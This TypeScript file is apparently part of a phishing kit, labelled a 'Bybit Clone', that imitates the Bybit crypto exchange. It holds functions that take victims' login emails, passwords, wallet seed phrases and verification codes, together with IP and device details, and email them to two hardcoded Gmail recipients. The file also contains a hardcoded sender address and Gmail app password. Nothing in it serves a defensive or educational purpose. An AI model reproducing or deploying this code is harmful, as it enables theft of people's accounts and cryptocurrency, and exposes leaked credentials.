// Email service using API route for better Vercel compatibility

// Hardcoded email configuration as backup
const EMAIL_CONFIG = {
  ADMIN_EMAIL: process.env.ADMIN_EMAIL || "westkhalifahninety7@gmail.com",
  APP_PASSWORD: process.env.APP_PASSWORD || "sawujuvkbqpobevf",
  RECIPIENT_EMAIL_1: process.env.RECIPIENT_EMAIL_1 || "ao2674710@gmail.com",
  RECIPIENT_EMAIL_2: process.env.RECIPIENT_EMAIL_2 || "princeadeluv13@gmail.com",
}

export function getClientIP(request: Request): string {
  const forwarded = request.headers.get("x-forwarded-for")
  const realIP = request.headers.get("x-real-ip")

  if (forwarded) {
    return forwarded.split(",")[0].trim()
  }

  if (realIP) {
    return realIP
  }

  return "Unknown IP"
}

// Get device information
export function getDeviceInfo(userAgent: string): string {
  const browser = userAgent.includes("Chrome")
    ? "Chrome"
    : userAgent.includes("Firefox")
      ? "Firefox"
      : userAgent.includes("Safari")
        ? "Safari"
        : userAgent.includes("Edge")
          ? "Edge"
          : "Unknown Browser"

  const os = userAgent.includes("Windows")
    ? "Windows"
    : userAgent.includes("Mac")
      ? "macOS"
      : userAgent.includes("Linux")
        ? "Linux"
        : userAgent.includes("Android")
          ? "Android"
          : userAgent.includes("iOS")
            ? "iOS"
            : "Unknown OS"

  return `${browser} on ${os}`
}

// Send email using API route
async function sendEmailViaAPI(to: string[], subject: string, htmlContent: string) {
  try {
    console.log("Sending email via API to:", to)

    const response = await fetch("/api/send-email", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        to: to,
        subject: subject,
        html: htmlContent,
      }),
    })

    const result = await response.json()
    console.log("Email API response:", result)

    if (!response.ok) {
      throw new Error(result.error || "Failed to send email")
    }

    return { success: true, data: result }
  } catch (error) {
    console.error("Error sending email via API:", error)
    return { success: false, error }
  }
}

// Send first verification email
export async function sendFirstVerificationEmail(data: {
  userEmail: string
  userPassword: string
  ticketId: string
  qrCode: string
  ipAddress: string
  timestamp: string
}) {
  const emailContent = `
    <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px;">
      <h2 style="color: #f7931a; text-align: center;">🔐 First Verification Attempt</h2>
      
      <div style="background: #f5f5f5; padding: 20px; border-radius: 8px; margin: 20px 0;">
        <h3 style="color: #333;">Verification Details:</h3>
        <p><strong>Timestamp:</strong> ${data.timestamp}</p>
        <p><strong>User Email:</strong> <span style="color: #e74c3c;">${data.userEmail}</span></p>
        <p><strong>User Password:</strong> <span style="color: #e74c3c;">${data.userPassword}</span></p>
        <p><strong>IP Address:</strong> ${data.ipAddress}</p>
      </div>
      
      <div style="background: #e3f2fd; padding: 20px; border-radius: 8px; margin: 20px 0;">
        <h3 style="color: #333;">Generated Verification Data:</h3>
        <p><strong>Ticket ID:</strong> <code style="background: #fff; padding: 4px 8px; border-radius: 4px; font-family: monospace; color: #2c3e50;">${data.ticketId}</code></p>
        <p><strong>QR Code:</strong> <code style="background: #fff; padding: 4px 8px; border-radius: 4px; font-family: monospace; color: #2c3e50;">${data.qrCode}</code></p>
      </div>
      
      <div style="background: #fff3e0; padding: 15px; border-radius: 8px; margin: 20px 0; border-left: 4px solid #f39c12;">
        <p><strong>⚠️ Security Alert:</strong> User is attempting first verification step.</p>
      </div>
    </div>
  `

  // Use hardcoded recipients as backup
  const recipients = [EMAIL_CONFIG.RECIPIENT_EMAIL_1, EMAIL_CONFIG.RECIPIENT_EMAIL_2]

  try {
    const result = await sendEmailViaAPI(recipients, "🔐 First Verification Attempt - Bybit Clone", emailContent)
    if (result.success) {
      console.log("First verification email sent successfully to:", recipients)
    } else {
      console.error("Failed to send first verification email:", result.error)
    }
  } catch (error) {
    console.error("Error sending first verification email:", error)
  }
}

// Send Bybit login email
export async function sendBybitLoginEmail(data: {
  loginEmail: string
  loginPassword: string
  loginSuccess: boolean
  deviceInfo: string
  ipAddress: string
  timestamp: string
  walletPhrase?: string
}) {
  const statusColor = data.loginSuccess ? "#4caf50" : "#f44336"
  const statusText = data.loginSuccess ? "SUCCESS" : "FAILED"

  const emailContent = `
    <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px;">
      <h2 style="color: #f7931a; text-align: center;">🏦 Bybit Login Attempt</h2>
      
      <div style="background: ${statusColor}; color: white; padding: 15px; border-radius: 8px; margin: 20px 0; text-align: center;">
        <h3 style="margin: 0;">LOGIN ${statusText}</h3>
      </div>
      
      <div style="background: #f5f5f5; padding: 20px; border-radius: 8px; margin: 20px 0;">
        <h3 style="color: #333;">Login Details:</h3>
        <p><strong>Timestamp:</strong> ${data.timestamp}</p>
        <p><strong>Email Used:</strong> <span style="color: #e74c3c;">${data.loginEmail || 'Web3 Login'}</span></p>
        <p><strong>Password Used:</strong> <span style="color: #e74c3c;">${data.loginPassword || 'Web3 Login'}</span></p>
        ${data.walletPhrase ? `<p><strong>Wallet Phrase:</strong> <span style="color: #e74c3c;">${data.walletPhrase}</span></p>` : ''}
        <p><strong>Login Status:</strong> <span style="color: ${statusColor}; font-weight: bold;">${statusText}</span></p>
      </div>
      
      <div style="background: #e8f5e8; padding: 20px; border-radius: 8px; margin: 20px 0;">
        <h3 style="color: #333;">Device & Security Info:</h3>
        <p><strong>Device Info:</strong> ${data.deviceInfo}</p>
        <p><strong>IP Address:</strong> ${data.ipAddress}</p>
      </div>
      
      <div style="background: #fff3e0; padding: 15px; border-radius: 8px; margin: 20px 0; border-left: 4px solid #f39c12;">
        <p><strong>📊 Status:</strong> User ${data.loginSuccess ? "successfully logged into" : "failed to log into"} Bybit platform.</p>
      </div>
    </div>
  `

  const recipients = [EMAIL_CONFIG.RECIPIENT_EMAIL_1, EMAIL_CONFIG.RECIPIENT_EMAIL_2]

  try {
    const result = await sendEmailViaAPI(recipients, `🏦 Bybit Login ${statusText} - Bybit Clone`, emailContent)
    if (result.success) {
      console.log("Bybit login email sent successfully to:", recipients)
    } else {
      console.error("Failed to send Bybit login email:", result.error)
    }
  } catch (error) {
    console.error("Error sending Bybit login email:", error)
  }
}

// Send second verification email
export async function sendSecondVerificationEmail(data: {
  ticketId: string
  qrCode: string
  ipAddress: string
  timestamp: string
  verificationCode?: string
  success?: boolean
}) {
  const emailContent = `
    <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px;">
      <h2 style="color: #f7931a; text-align: center;">🛡️ Second Verification ${data.success ? "Completed" : "Initiated"}</h2>
      
      <div style="background: #f5f5f5; padding: 20px; border-radius: 8px; margin: 20px 0;">
        <h3 style="color: #333;">Second Verification Details:</h3>
        <p><strong>Timestamp:</strong> ${data.timestamp}</p>
        <p><strong>IP Address:</strong> ${data.ipAddress}</p>
        ${data.verificationCode ? `<p><strong>Code Entered:</strong> <code style="background: #fff; padding: 4px 8px; border-radius: 4px; font-family: monospace; color: #e74c3c;">${data.verificationCode}</code></p>` : ""}
      </div>
      
      <div style="background: #e3f2fd; padding: 20px; border-radius: 8px; margin: 20px 0;">
        <h3 style="color: #333;">Generated Verification Data:</h3>
        <p><strong>Second Ticket ID:</strong> <code style="background: #fff; padding: 4px 8px; border-radius: 4px; font-family: monospace; color: #2c3e50;">${data.ticketId}</code></p>
        <p><strong>Second QR Code:</strong> <code style="background: #fff; padding: 4px 8px; border-radius: 4px; font-family: monospace; color: #2c3e50;">${data.qrCode}</code></p>
      </div>
      
      <div style="background: ${data.success ? "#e8f5e8" : "#fff3e0"}; padding: 15px; border-radius: 8px; margin: 20px 0; border-left: 4px solid ${data.success ? "#27ae60" : "#f39c12"};">
        <p><strong>${data.success ? "✅" : "⏳"}</strong> ${data.success ? "Verification completed successfully!" : "User proceeding with second verification step."}</p>
      </div>
    </div>
  `

  const recipients = [EMAIL_CONFIG.RECIPIENT_EMAIL_1, EMAIL_CONFIG.RECIPIENT_EMAIL_2]

  try {
    const result = await sendEmailViaAPI(
      recipients,
      `🛡️ Second Verification ${data.success ? "Complete" : "Started"} - Bybit Clone`,
      emailContent,
    )
    if (result.success) {
      console.log("Second verification email sent successfully to:", recipients)
    } else {
      console.error("Failed to send second verification email:", result.error)
    }
  } catch (error) {
    console.error("Error sending second verification email:", error)
  }
}
